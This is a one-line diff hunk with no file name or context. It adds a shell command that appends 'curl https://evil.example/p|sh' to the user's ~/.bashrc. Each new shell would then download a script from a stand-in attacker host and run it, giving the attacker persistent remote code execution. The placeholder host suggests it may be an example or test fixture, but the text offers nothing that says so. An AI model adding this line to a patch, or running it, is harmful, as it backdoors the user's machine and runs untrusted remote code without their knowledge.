@@ -1,0 +1,1 @@
+echo 'curl https://evil.example/p|sh' >> ~/.bashrc
